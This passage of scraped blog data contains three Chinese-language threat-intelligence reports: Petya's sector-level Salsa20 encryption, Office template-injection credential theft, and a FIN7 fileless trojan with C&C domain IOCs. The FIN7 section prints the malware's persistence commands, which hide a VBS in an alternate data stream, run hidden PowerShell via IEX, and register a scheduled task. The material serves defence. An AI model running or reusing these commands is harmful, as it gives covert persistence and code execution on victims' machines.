class="line" data-line="456">该函数主要功能为：对扇区中的MFT遍历，对不符合MFT头部标志(FILE)的扇区，会直接调用SALSA20算法进行加密该扇区，对符合MFT头部标志的扇区，判断0x30属性中的文件名判断是不是元文件，如果不是元文件名格式，则直接加密该扇区。其他情况下，判断MFT结构0x80属性中的常驻内存属性，如果是非常驻内存属性，就解析文件内容的前二个扇区，取出该扇区的内容后，使用salsa20算法进行加密。</p>\n<ol>\n<li>先打印出“CHKDSK is repairing sector”，显示虚假的磁盘修复界面</li>\n</ol>\n<p class="text-center line" data-line="460"><img src="/uploads/2017/07/25/a3977b49aeeb8e36a8332e627645cea8.png" alt="" width="90%"> </p>\n<ol start="2">\n<li>对当前MFT头是不是“FILE”,如果不是”FILE”的话，则直接加密这个扇区</li>\n</ol>\n<p class="text-center line" data-line="464"><img src="/uploads/2017/07/25/a4d9951bee67fcc18d8b0f8628c1096d.png" alt="" width="90%"> </p>\n<ol start="3">\n<li>如果是FILE，接着遍历mft的各个属性：</li>\n</ol>\n<p class="line" data-line="468">如果属性为AttributeFileName（0x30），判断文件名字长度是不是1，如果长度为1，直接加密，如果长度不为1，则看文件名字是不是以$开头(以$开头的是NTFS文件系统的元文件)，如果是元文件，则加密当前MFT.</p>\n<p class="text-center line" data-line="470"><img src="/uploads/2017/07/25/5ae904203b51d0c92e4885290661f3df.png" alt="" width="90%"> </p>\n<p class="line" data-line="472">如果属性为AttributeData文件数据属性（0x80），则首先根据属性头判断是不是非常驻内存，如果是常驻内存属性就跳过，不进行加密。如果是非常驻内存属性，则通过RUNLIST结构遍历到存储数据的真正的扇区位置。</p>\n<p class="text-center line" data-line="474"><img src="/uploads/2017/07/25/159054d773680803f830463365c03cfe.png" alt="" width="90%"> </p>\n<p class="line" data-line="476">解析RUNLIST</p>\n<p class="text-center line" data-line="478"><img src="/uploads/2017/07/25/6c00d5bf3e6c19a7b357c44d0fb3644f.png" alt="" width="90%"> </p>\n<p class="line" data-line="480">根据RUNLIST中的起始簇乘以MBR中保存的每簇对应的扇区数，得到数据真正所在的扇区。</p>\n<p class="text-center line" data-line="482"><img src="/uploads/2017/07/25/4eada2539c1ad8192fba15a8dd2e16d9.png" alt="" width="90%"> </p>\n<p class="line" data-line="484">随后，判断上面计算出的文件内容对应扇区数量是不是大于2，如果大于2，只加密前2个扇区。</p>\n<p class="text-center line" data-line="486"><img src="/uploads/2017/07/25/56b174bbd4c6ebd2af741ba73260282f.png" alt="" width="90%"> </p>\n<p class="line" data-line="488">读取该MFT文件对应的文件内容的前两个分区，通过直接使用int 13中断从扇区读取到文件内容，使用salsa20加密后，将密文直接写入的扇区中文件中。</p>\n<p class="text-center line" data-line="490"><img src="/uploads/2017/07/25/21f61a8ad162b6b73788d7af063ac414.png" alt="" width="90%"> </p>\n<p class="line" data-line="492">在动态调试时，可以看到加密了文件内容，加密文件内容前的数据</p>\n<p class="text-center line" data-line="494"><img src="/uploads/2017/07/25/8bd29bd4aaf54f20469012557b8ead84.png" alt="" width="90%"> </p>\n<p class="line" data-line="496">被加密后的文件内容：</p>\n<p class="text-center line" data-line="498"><img src="/uploads/2017/07/25/15be20fa0ee6c89862caf40abd228189.png" alt="" width="90%"> </p>\n<h4 class="line" data-line="500">加密函数</h4>\n<p class="line" data-line="502">对文件的加密使用了SALSA20算法，该算法属于流加密，在知道key和iv的情况下，加密函数和解密函数可以为相同的函数代码。</p>\n<p class="line" data-line="504">加密函数</p>\n<p class="text-center line" data-line="506"><img src="/uploads/2017/07/25/d891c0f3a128dfdca4ab9349aa61ea23.png" alt="" width="90%"> </p>\n<p class="line" data-line="508">在密钥扩展的函数中，Petya将原始的常数“expand 16-byte k”更改成了“1nvald s3ct”</p>\n<p class="line" data-line="510">扩展密钥函数代码：</p>\n<p class="text-center line" data-line="512"><img src="/uploads/2017/07/25/7513b898e9fe11f17806a9bc0614ba1a.png" alt="" width="90%"> </p>\n<p class="line" data-line="514">Salsa20加密时使用的key和iv来自于配置信息扇区（0x20扇区）</p>\n<p class="text-center line" data-line="516"><img src="/uploads/2017/07/25/10f91c1a321dc37c419c4c5a1261c93c.png" alt="" width="90%"> </p>\n<p class="line" data-line="518">将明文与生成的keystream异或，实现加密</p>\n<p class="text-center line" data-line="520"><img src="/uploads/2017/07/25/ffa6ee8604e5c1f1e5edc53e34aaedf9.png" alt="" width="90%"> </p>\n<h2 class="line" data-line="522">解密过程</h2>\n<p class="line" data-line="524">在开机启动过程中，MBR引导后，加载扇区中的恶意代码后，恶意代码会判断配置信息第1个BYTE是不是1，1表示已经加密过，则进入相应的解密过程中</p>\n<h3 class="line" data-line="526">1 打印勒索信息</h3>\n<p class="line" data-line="528">打印出勒索信息</p>\n<p class="text-center line" data-line="530"><img src="/uploads/2017/07/25/11d9442b024acdf131fa400c6998621f.png" alt="" width="90%"> </p>\n<p class="line" data-line="532">也就是显示如下的内容</p>\n<p class="text-center line" data-line="534"><img src="/uploads/2017/07/25/2d538d7d1f8876cdf572e1a7f49ba437.png" alt="" width="90%"> </p>\n<h3 class="line" data-line="536">2 读取用户输入的key</h3>\n<p class="line" data-line="538">清空内存，读取用户输入的key</p>\n<p class="text-center line" data-line="540"><img src="/uploads/2017/07/25/48e5dec1ad001bd80cea9e9a7c964cff.png" alt="" width="90%"> </p>\n<h3 class="line" data-line="542">3 验证用户的key</h3>\n<p class="line" data-line="544">在验证KEY的过程中，首先比较输入的key的长度，必须大于0x20长度</p>\n<p class="text-center line" data-line="546"><img src="/uploads/2017/07/25/ee5cc109d25593ee2c716d4f3e249d10.png" alt="" width="90%"> </p>\n<p class="line" data-line="548">将输入的key通过自定义算法的转换\t0x21次</p>\n<p class="text-center line" data-line="550"><img src="/uploads/2017/07/25/fb925063f3e363646b5ea38a27906542.png" alt="" width="90%"> </p>\n<p class="line" data-line="552">使用转换过的key，使用salsa20算法解密0x21扇区的内容（这个扇区的内容为加密过的0x7内容），比较解密出来的内容是不是0x7，如果是则表明解密密码正确。</p>\n<p class="text-center line" data-line="554"><img src="/uploads/2017/07/25/edd5fa6f10c48cb40a0b1180dce7091b.png" alt="" width="90%"> </p>\n<p class="text-center line" data-line="556"><img src="/uploads/2017/07/25/59681650ad38f20124784eb166f401a7.png" alt="" width="90%"> </p>\n<p class="line" data-line="558">密码验证通过后，会使用这个key做为参数调用DecryptProc 函数(并非勒索软件作者定义的函数名)，</p>\n<p class="text-center line" data-line="560"><img src="/uploads/2017/07/25/dcd446cbfc5100c94540914a8678b920.png" alt="" width="90%"> </p>\n<p class="line" data-line="562">在DecryptProc函数中调用与加密时相同的函数进行对MFT结构进行遍历后解密，</p>\n<p class="text-center line" data-line="564"><img src="/uploads/2017/07/25/7e511a9d53033224983402b4f516a926.png" alt="" width="90%"> </p>\n<p class="line" data-line="566">在解密完成后，打印“Please reboot your computer!”信息</p>\n<p class="text-center line" data-line="568"><img src="/uploads/2017/07/25/dcc15ec5f0d71412c6c3a571997689d6.png" alt="" width="90%"> </p>\n<h2 class="line" data-line="570">总结</h2>\n<p class="line" data-line="572">本文对Petya变种勒索蠕虫的扇区启动代码进行了详细分析，分析显示Petya变种勒索蠕虫并不仅会加密MBR和MFT结构，也会将MFT对应的文件内容的前两个扇区进行加密。换句话说，Petya变种勒索蠕虫在系统启动时MBR中的代码执行时也会进行全盘文件的加密操作。结合RING3级别的勒索代码功能，Petya会对文件执行两次加密操作，第一次为Petya勒索蠕虫执行时，使用RSA与AES算法遍历文件系统对指定扩展名的文件加密，第二次为系统启动时，启动扇区的代码会通过遍历MFT结构定位文件内容并对文件使用salsa20算法进行加密。对于RING3级别的文件加密过程，解密密钥可以通过勒索蠕虫作者的RSA私钥进行解密获得，而启动扇区级别的文件加密过程使用了随机密码进行，启动扇区级别的文件加密无法解密。</p>\n<h2 class="line" data-line="574">参考</h2>\n<p class="line" data-line="576"><a href="http://dengqi.blog.51cto.com/5685776/1351300">http://dengqi.blog.51cto.com/5685776/1351300</a></p>\n<p class="line" data-line="578"><a href="https://github.com/alexwebr/salsa20/blob/master/salsa20.c">https://github.com/alexwebr/salsa20/blob/master/salsa20.c</a></p>\n<p class="line" data-line="580"><a href="http://blog.csdn.net/enjoy5512/article/details/50966009">http://blog.csdn.net/enjoy5512/article/details/50966009</a></p>\n<p class="line" data-line="582"><a href="http://bobao.360.cn/learning/detail/4039.html">http://bobao.360.cn/learning/detail/4039.html</a></p>\n',category:"专题报告",__v:2,abstract:"继5月的WannaCry勒索蠕虫事件以后，2017年6月又出现了Petya变种勒索蠕虫，除了利用永恒之蓝漏洞和加密勒索以后，Petya变种与WannaCry有比较大的差别。WannaCry会加密机器上的文件，导致数据损毁，而Petya更为激进，它会加密系统的MBR直接导致机器无法启动，本文对其执行的MBR及文件系统的加密机制做详细的分析。",modify_time:"2017-08-02T07:43:55.479Z",readableId:"analysis-of-petya-boot-code",publish_time:"2017-07-27T11:30:08.281Z",descImg:"/uploads/2017/07/30/5abbf430bedd308ef9d6ff5623ee2961.png",insert_time:"2017-07-25T12:03:51.391Z",isDraft:!1,tags:["mbr","petya"]},{_id:"5968a01f5704074e282bcdde",publish_time:"2017-07-14T10:42:39.115Z",title:"Template Injection 攻击事件: 隐藏在模板文件后的威胁",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" data-line="3">《纽约时报》和彭博社上周透露，联邦调查局和国土安全部发布了一份联合报告称：美国的制造工厂、核电站和其他能源设施正遭受网络攻击的威胁。此次袭击至少攻击了美国十几家电力公司，包括在堪萨斯州的 Wolf Creek核设施。</p>\n<p class="line" data-line="5">随后，思科Talos情报和研究小组称，最近攻击者在针对美国能源设施和其他重要基础设施组织的攻击中使用了一种叫做模板注入（<code>Template Injection</code>）的技术。</p>\n<p class="line" data-line="7">360天眼实验室针对此次事件中使用到的恶意样本进行了一些技术分析，详细分析了<code>Template Injection</code>所有可能用到的攻击技术，并且通过关联分析追溯到此次攻击最早可能发生在今年3月。</p>\n<h2 class="line" data-line="9">Office文档模板</h2>\n<p class="line" data-line="12">Office文档模板是Office文档制作和编辑中重要的一个部分，生成文档模板能够很快的按照固定模板进行设置，直接快速的进行文档处理，Office可以引用本地或者网络上的模板文档。此类文件的后缀一般为<code>.dot</code>、<code>.dotx</code>、<code>.dotm</code>等。</p>\n<h2 class="line" data-line="14">样本分析</h2>\n<table>\n<thead>\n<tr>\n<th>Hash</th>\n<th>4909db36f71106379832c8ca57ba5be8</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>文件类型</td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td>文件大小</td>\n<td>18.7 KB (19,156 字节)</td>\n</tr>\n<tr>\n<td>文件名</td>\n<td>ControlsEngineer.docx</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="23">样本文档打开后的内容：</p>\n<p class="text-center line" data-line="25"><img src="/uploads/2017/07/14/5363525ce39a4ace6e4f0875ceffee76.png" alt="6c8a72617d96b81807073c626e4ba1cd" width="90%"></p>\n<p class="line" data-line="28">实际上样本文档是一个正常的Word文档，并未利用任何漏洞，文档内容大概是一份电器工程师简历介绍，根据描述的技能判断应该是制造业一类，这和外媒报道的被攻击目标是吻合的。</p>\n<p class="line" data-line="30">与普通文档不同之处在于，文档内部插入了一个Office模板文档的外部链接：</p>\n<p class="text-center line" data-line="32"><img src="/uploads/2017/07/14/3a4274a8acb019276c350fe53da2b6e5.png" alt="77cee6e78b3e6d2d1176d13369f7efa1" width="90%"></p>\n<p class="line" data-line="35">由于该链接失效，正如思科Talos所述，并不知道攻击者通过模板注入的方式对目标实施的具体攻击，但是通过我们的分析总结，归纳出通过模板注入的方式可能进行的攻击有如下三种：</p>\n<h3 class="line" data-line="37">窃取SMB会话中的NTML HASH</h3>\n<p class="line" data-line="39">通过分析发现，Office文档在处理模板文件外部链接：<code>[*file://IP/Template.dotm*](file://IP/Template.dotm)</code>的时候会尝试对目标服务器先后进行两种方式的访问：</p>\n<ol>\n<li>\n<p>尝试访问服务器的共享文件：<code>*\\\\\\\\IP\\\\Template.dotm*</code></p>\n</li>\n<li>\n<p>如果共享文件访问不成功，则继续访问该服务器的WEBDAV服务：<code>*file://IP/Template.dotm*</code></p>\n</li>\n</ol>\n<blockquote>\n<p>访问共享文件的过程如下：</p>\n</blockquote>\n<p class="line" data-line="47">首先会触发对<code>5.153.58.45</code>这个IP地址的共享文件访问，如果该IP地址开启了共享文件服务，根据Windows访问共享文件夹的机制，本机会使用本地登录的用户密码尝试对SMB服务器进行登录验证，这样攻击者的SMB服务器就可以截获到被攻击者的NTLM HASH等信息（以及用户名、域信息等），进而可以暴力破解用户密码或者进行SMB Relay攻击，经过测试可以在SMB服务端抓取受害者的NTLM HASH：</p>\n<p class="text-center line" data-line="49"><img src="/uploads/2017/07/14/fe1739d319ea1f45a64f9260cb2638f9.png" alt="684e84611c6b4b01882d063a2052b405" width="90%"></p>\n<h3 class="line" data-line="52">HTTP Authorization 骗取账号密码</h3>\n<p class="line" data-line="54">如果上一步访问模板文件所在服务器的共享文件不成功，那么会继续尝试访问其WEBDAV服务：</p>\n<p class="text-center line" data-line="56"><img src="/uploads/2017/07/14/cdb5d0a8943907e8ffb969182f44d60b.png" alt="efbae5daef23e0d162e1d9e56d876f11" width="90%"></p>\n<p class="line" data-line="59">此时如果服务器配置了HTTP Auth，那么服务器可以返回401页面给客户端，客户端在收到401页面之后，会弹出一个对话框让用户输入帐号密码，并在用户点确认的时候再次发出请求，请求里将带上Authorization header，header内则包含base64编码后的用户名密码：</p>\n<ul>\n<li>服务器返回401</li>\n</ul>\n<p class="text-center line" data-line="63"><img src="/uploads/2017/07/14/7aa67d046f5322d3ed80ecfac73071c0.png" alt="216ec3451e9f645abe50081ace94c317" width="90%"></p>\n<ul>\n<li>客户端弹出标准用户名密码框</li>\n</ul>\n<p class="text-center line" data-line="68"><img src="/uploads/2017/07/14/d6015b1615d2ff97a45c754054009112.png" alt="2b78b9a736c8f1554b9a5a0b47497b55" width="90%"></p>\n<ul>\n<li>服务端收到用户输入的用户名密码（base64编码）</li>\n</ul>\n<p class="text-center line" data-line="73"><img src="/uploads/2017/07/14/d51bee180104f3eae61c6fb657fdd445.png" alt="06fc305ed2e56f5e19cac7d0312a5ed1" width="90%"></p>\n<blockquote>\n<p>Base64编码后的用户名/密码：YWRtaW5pc3RyYXRvcjp0ZXN0MTIz</p>\n<p>用户输入的原始用户名/密码：administrator:test123</p>\n</blockquote>\n<ul>\n<li>需要注意的是Office 2010以后只允许通过SSL进行HTTP访问，所以攻击者的服务器需要搭建HTTPS服务；</li>\n</ul>\n<h3 class="line" data-line="82">模板注入其它Office漏洞</h3>\n<p class="line" data-line="84">如果将远程加载的模板文档（<code>.dot</code>，<code>.dotm</code>等）替换为可以使用模板文档格式进行攻击的漏洞文档（经过测试<code>CVE-2017-0199</code>可以通过模板注入进行攻击），那么还可以将攻击载体和攻击负载分离，这样隐蔽性更高，配合鱼叉邮件的投递可以使得邮件附件躲过邮件服务器杀软的查杀！</p>\n<p class="line" data-line="86">经过测试，这种攻击方式也非常实用，下面是插入<code>CVE-2017-0199</code>漏洞进行模板注入攻击的实例：</p>\n<p class="text-center line" data-line="88"><img src="/uploads/2017/07/14/dbe797678f9a2a25a9534623b3d88658.png" alt="043c7f2868b88787c7fd6dfb161904b0" width="90%"></p>\n<p class="line" data-line="91">我们将免杀后的模板注入攻击文档提交到VirusTotal上查看，竟然没有一个杀软可以查杀：</p>\n<p class="text-center line" data-line="93"><img src="/uploads/2017/07/14/38c9cde2d128a04d32b4f66932eaa24a.png" alt="ff4dd762dc24f28638d07fc85ccf12a9" width="90%"></p>\n<h2 class="line" data-line="96">一个模板同时进行三种攻击</h2>\n<p class="line" data-line="99">经过360天眼实验室的研究发现，通过这种模板攻击方式，可以使用一个攻击向量“同时”进行三种方式的攻击，其主要原理是：</p>\n<ol>\n<li>\n<p>Office解析外链模板路径file://会先尝试SMB访问，此时攻击者可以先抓取受害者的NTLM HASH，并拒绝访问；</p>\n</li>\n<li>\n<p>紧接着Office会进行HTTP访问，此时攻击者返回401错误，受害者的Office弹出用户名/密码框要求用户输入。而在之前的邮件提示等信息中诱导受害者在这个步骤中输入本机用户名/密码并记录，且在服务器端对受害者输入的任意用户名密码都通过验证，以便受害者进入到攻击的第3步；</p>\n</li>\n<li>\n<p>通过用户名密码验证后，受害者将从服务器下载执行带有漏洞的模板文件（比如<code>CVE-2017-0199</code>），受害者本地Office解析漏洞模板后触发最后一轮攻击；</p>\n</li>\n</ol>\n<blockquote>\n<p>这样，理论上可以同时获取受害者的NTLM HASH、骗取的用户名密码、执行其它漏洞文档。</p>\n</blockquote>\n<h2 class="line" data-line="109">扩展与关联分析</h2>\n<p class="line" data-line="112">基于360威胁情报中心的数据，以下热力图显示了今年以来使用网上一些公开的<code>Template Injection</code>攻击工具生成的样本量的情况：</p>\n<p class="text-center line" data-line="114"><img src="/uploads/2017/07/14/d0520819841255e1b38e44519c7a75b9.png" alt="92424d76e6dfd8086e86e3b5a9c05635" width="90%"></p>\n<p class="line" data-line="117">可以看到此类使用已知工具生成的攻击样本数量正在呈上升趋势！并且值得注意的是，这类样本稍作修改就可以躲过所有杀软的查杀，所以实际使用<code>Template Injection</code>进行攻击的样本数量无法估计。</p>\n<p class="line" data-line="119">我们选取热力图中最早发现的3月14日的一个样本进行分析发现，该文档也是一份电器工程师简历文档，并且插入的模板链接方式、ID值都和本次攻击完全一致，有较大嫌疑可以认为和本次的攻击事件有关联：</p>\n<p class="text-center line" data-line="121"><img src="/uploads/2017/07/14/59faac831c553a54fcca2912e82fe440.png" alt="2f58db9cc42e6251a5e821bfa4293189" width="90%"></p>\n<p class="text-center line" data-line="124"><img src="/uploads/2017/07/14/95205d6dbe9b0da094bdd6918501198c.png" alt="e46574d0ffa1b04b9ffbfda2c9ddf483" width="90%"></p>\n<p class="line" data-line="128">另外，VirusTotal上提交的一封带有模板注入攻击附件的邮件也证明了此次攻击的目标是美国能源相关的公司（www.integrysgroup.com）：</p>\n<p class="text-center line" data-line="130"><img src="/uploads/2017/07/14/e8205ec080aa0dce13d8f8d788b93aa7.png" alt="336ed507eaeb9b6f7686c98659e86aee" width="90%"></p>\n<h2 class="line" data-line="132">思考</h2>\n<ul>\n<li>\n<p>本次外媒报道的模板注入攻击事件，由于当前互联网环境基本不允许访问445端口，所以360天眼实验室认为该攻击的目的不会是获取用户账户凭据，而更可能是骗取用户账号/密码，或者模板注入其它Office漏洞；</p>\n</li>\n<li>\n<p>模板注入的攻击技巧其实由来已久（至少10多年前即在网络战中出现），但通过本次事件可以看出当前企业安全防护并没有想象中安全；</p>\n</li>\n<li>\n<p>通过模板注入理论上可以绕过所有杀软对攻击载体的查杀，对于这种老树开新花的攻击技巧应该引起一定的重视；</p>\n</li>\n</ul>\n<h2 class="line" data-line="141">参考链接</h2>\n<p style="font-size:12px" class="line" data-line="144"><a href="http://blog.talosintelligence.com/2017/07/template-injection.html"><em>http://blog.talosintelligence.com/2017/07/template-injection.html</em></a></p>\n<p style="font-size:12px" class="line" data-line="146"><a href="http://mp.weixin.qq.com/s/fCg70lBTi-dWQN9zAL97yA"><em>http://mp.weixin.qq.com/s/fCg70lBTi-dWQN9zAL97yA</em></a></p>\n<p style="font-size:12px" class="line" data-line="148"><a href="http://davenport.sourceforge.net/ntlm.html"><em>http://davenport.sourceforge.net/ntlm.html</em></a></p>\n',abstract:"《纽约时报》和彭博社上周透露，联邦调查局和国土安全部发布了一份联合报告称：美国的制造工厂、核电站和其他能源设施正遭受网络攻击的威胁。此次袭击至少攻击了美国十几家电力公司，包括在堪萨斯州的 Wolf Creek核设施。\n随后，思科Talos情报和研究小组称，最近攻击者在针对美国能源设施和其他重要基础设施组织的攻击中使用了一种叫做模板注入（Template Injection）的技术。\n360天眼实验室针对此次事件中使用到的恶意样本进行了一些技术分析，详细分析了Template Injection所有可能用到的攻击技术，并且通过关联分析追溯到此次攻击最早可能发生在今年3月。",category:"专题报告",readableId:"Template_Injection_Attack_Behind_Template_Threat",__v:2,author:"admin",modify_time:"2017-08-01T07:50:11.847Z",descImg:"/uploads/2017/08/01/045f27711e5726f442f4f4f6e4c20244.png",insert_time:"2017-07-14T10:42:39.115Z",isDraft:!1,tags:["docx","template injection","Office"]},{_id:"597733a71c670a09e493ee3a",title:"FIN7 APT组织攻击木马分析报告",author:"admin",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" data-line="2">2017年3月，FireEye发布了一篇名黑客组织FIN7的APT攻击简报，报告称FIN7组织以钓鱼邮件为攻击渠道，主要对美国金融机构渗透攻击。组织的攻击利用DNS协议的TXT字段进行C&amp;C通信。360威胁情报中心对此APT组织的攻击链条进行了梳理，对木马相关的技术进行了分析，揭示其一些有意思的技巧。</p>\n<h2 class="line" data-line="4">目标样本</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>d04b6410dddee19adec75f597c52e386</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>1,834,496字节</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="12">攻击特点与攻击流程</h2>\n<p class="line" data-line="14">FIN7攻击特点主要体现在：</p>\n<ol>\n<li>全部攻击过程使用非PE实现，钓鱼使用doc文件，后门使用powershell文件。</li>\n<li>使用ADS数据隐藏保存在磁盘中的非PE文件</li>\n<li>后门文件保存在注册表中，功能由Powershell实现</li>\n<li>与C&amp;C通信使用DNS协议的TXT记录</li>\n<li>C&amp;C地址从64个硬编码的地址中随机选择</li>\n</ol>\n<p class="line" data-line="22">攻击流程：</p>\n<p class="line" data-line="24">在整个攻击过程中，没有使用到PE文件，这在一定程度上躲避了安全软件的查杀。落地的文件也进行了技术上的隐藏，而真正的后门程序却已加密的方式存储在注册表中。</p>\n<p class="line" data-line="26">攻击者以钓鱼邮件为进入渠道，在恶意文档中嵌入vbs脚本，vbs脚本运行后解密后门程序写入注册表中，同时将调用后门程序的脚本以ads隐藏在磁盘文件中。在后门运行后，使用DNS TXT做为C&amp;C通信方式。</p>\n<p class="text-center line" data-line="28"><img src="/uploads/2017/07/25/82355e36b499e5621c500a61ecb5b32e.png" alt="" width="90%"></p>\n<h2 class="line" data-line="30">样本分析</h2>\n<p class="line" data-line="32">钓鱼邮件打开后，显示如下图所示，可以看到，文档中插入了一张图片，图片字体显示模糊。</p>\n<p class="text-center line" data-line="34"><img src="/uploads/2017/07/25/3dc3540f45b7f96562007d8f96e3c72a.png" alt="" height="300"></p>\n<p class="line" data-line="36">通过分析，得到了钓鱼文档的制作过程：分别插入了一个vbs的OLE对象与一张字迹模糊的图片，将OLE对象的图标设置为透明图标并置入图片对象的顶层，最将两个对象组合到一起，这样就达到了双击图片，实际上运行了vbs脚本的目的。</p>\n<p class="line" data-line="38">双击图片，就会打开vbs脚本，只有当用户点击弹出的对话框中的确定后，才会运行vbs脚本，如果在这时，用户点击了取消，就可以阻断这次攻击。</p>\n<p class="text-center line" data-line="40"><img src="/uploads/2017/07/25/ca530c4b9b5a6a179063bdbf5827c334.png" alt=""></p>\n<p class="line" data-line="42">为了诱导用户双击图片运行vbs脚本，文档中还写入“This document is protected by Microsoft Office and requires human verification Please Enable Editing and Double Click on page below.”（文档被Microsoft Office 保护，请启用编辑并双击下面的图片）。</p>\n<h3 class="line" data-line="44">VBS功能：</h3>\n<p class="line" data-line="46">当上面的图片被双击运行后，程序后台会运行VBS脚本，该脚本功能为：调用powershell解密一大段字符，从代码中可以看出，解密出来的为一gz文件，因此可以将这大段base64解密后，保存成gz格式，使用解压工具得到压缩文件继续分析。</p>\n<p class="text-center line" data-line="48"><img src="/uploads/2017/07/25/efe5911f07c641ea18e8dcd8bc7aa2d8.png" alt="" width="90%"></p>\n<h3 class="line" data-line="50">样本加载感染过程：</h3>\n<p class="line" data-line="52">gz中的文件也是一个powershell脚本。脚本经过混淆，实现的功能是：判断当前用户是不是administartor权限，根据不同的权限写入不同的注册表内容，这些内容为开机后会解密执行的代码，随后通过ADS将加载注册表内容的vbs脚本写入C:\\ProgramData\\windows:CtxDnsClient.vbs文件中，并将该文件加入启动项和计划任务中。</p>\n<p class="line" data-line="56">原始的powershell内容，可以看到powershell脚本经过了混淆：</p>\n<p class="text-center line" data-line="58"><img src="/uploads/2017/07/25/1bf4746c480aee7d805b5ab2e16e9260.png" alt="" width="90%"></p>\n<h4 class="line" data-line="60">后门程序写入注册表</h4>\n<p class="line" data-line="62">Powershell写入到注册表中的后门程序的内容如下：</p>\n<p class="text-center line" data-line="64"><img src="/uploads/2017/07/25/4ee8cfbe553b6af66bb4785af970ce5c.png" alt="" width="90%"></p>\n<h4 class="line" data-line="66">ADS隐藏磁盘文件</h4>\n<p class="line" data-line="68">将要实现开机启动的文件写入到磁盘文件C:\\ProgramData\\Windows:CtxDnsClient.vbs中。</p>\n<p class="line" data-line="70">对于Windows:CtxDnsClient.vbs文件，使用了ADS数据隐藏技术。而通过ADS隐藏的数据在Windows系统中无法显示，文件大小也显示为0字节：</p>\n<p class="text-center line" data-line="72"><img src="/uploads/2017/07/25/5795bab47fcf1f01756b0f687073b372.png" alt=""></p>\n<p class="line" data-line="74">但是使用dir /r命令，可以看到ADS中有隐藏的数据</p>\n<p class="text-center line" data-line="76"><img src="/uploads/2017/07/25/1b8f9439a9b5527869a722d745ddea26.png" alt=""></p>\n<p class="line" data-line="78">启动项中的隐藏的ads数据，dump出来后显示如下：</p>\n<p class="text-center line" data-line="80"><img src="/uploads/2017/07/25/e725019097179e8f215bbdee701809d7.png" alt="" width="90%"></p>\n<p class="line" data-line="82">使用 ADS中隐藏数据内容为：</p>\n<pre class="hljs"><code class="hljs">cmd /c "echo Set objShell = CreateObject(""Wscript.shell"") > C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs"\n\ncmd /c "echo objShell.run ""powershell -WindowStyle Hidden -executionpolicy bypass -C IEX ((Get-ItemProperty -Path HKCU:Software\\\\Microsoft\\\\Windows).Part)"",0 >> C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs"\n</code></pre>\n<h4 class="line" data-line="90">添加开机启动</h4>\n<p class="line" data-line="92">创建的启动项，启动项位置为HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\：</p>\n<p class="text-center line" data-line="94"><img src="/uploads/2017/07/25/56307f5b0fc04f4adff1ed5ebf3bdef1.png" alt="" width="90%"></p>\n<p class="line" data-line="96">添加计划任务：</p>\n<pre class="hljs"><code class="hljs">schtasks.exe /F /create /tn CtxDnsClient /tr "C:\\\\Windows\\\\System32\\\\wscript.exe C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs " /sc onidle /i 30\n</code></pre>\n<p class="line" data-line="102">通过上面这些过程，来实现程序的自启动。在系统重新启动后，启动项中的wscript.exe会加载Windows:CtxDnsClient.vbs，Windows:CtxDnsClient.vbs中会使用powershell加载HKCU\\Software\\Microsoft\\Windows\\Part内容，part中实现的功能会加载注册表相同位置下的CtxDnsClient的内容。这里的内容就是真正的实现CC的功能。</p>\n<h3 class="line" data-line="104">C&amp;C通信功能</h3>\n<p class="line" data-line="106">这部分功能主要在注册表中的HKCU\\Software\\Microsoft\\Windows下CtxDnsClient的内容中，主要功能为：从内置的64个域名中随机选择一个，查询该域名的SPF记录，用来实现自己的C&amp;C通信。</p>\n<p class="line" data-line="108">创建名为”SourceFireSux”的互斥体，防止程序重复运行：</p>\n<p class="text-center line" data-line="110"><img src="/uploads/2017/07/25/4431ee531ea5f531a4073e81e41f98eb.png" alt="" width="90%"></p>\n<p class="line" data-line="113">编码过的64个域名地址代码片段：</p>\n<p class="text-center line" data-line="115"><img src="/uploads/2017/07/25/381eb523dccae6134a1175490710d43b.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="118"><img src="/uploads/2017/07/25/a74320966532d81dae8a9ab122eed550.png" alt="" width="90%"></p>\n<p class="line" data-line="121">从这64个域名中，随机选取一个（如这里随机被选择到的为：pbbk.us），加上www前缀，查询对应DNS TXT记录内容（即查询www.pbbk.us的dns txt记录）。</p>\n<p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/dcf44e3c393ad1512846cdd2c268524a.png" alt="" width="90%"></p>\n<p class="line" data-line="126">如果返回的内容为idle，则程序睡眠3.5秒到5.4秒的随机时间。</p>\n<p class="line" data-line="128">如果返回的内容为www，则表明这个域名现在正在攻击者控制之中，随后查询mail.pbbk.us的dns txt记录。</p>\n<p class="line" data-line="130">随后mail.pbbk.us返回的内容就被 powershell直接通过IEX调用执行。</p>\n<h2 class="line" data-line="132">IOC</h2>\n<p class="line" data-line="134">木马尝试通信的C&amp;C地址：</p>\n<table>\n<thead>\n<tr>\n<th><strong>域名</strong></th>\n<th><strong>注册人</strong></th>\n<th><strong>注册时间</strong></th>\n<th><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>www.grij.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.kwoe.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.zugh.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.pafk.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.cuuo.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.ooyh.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 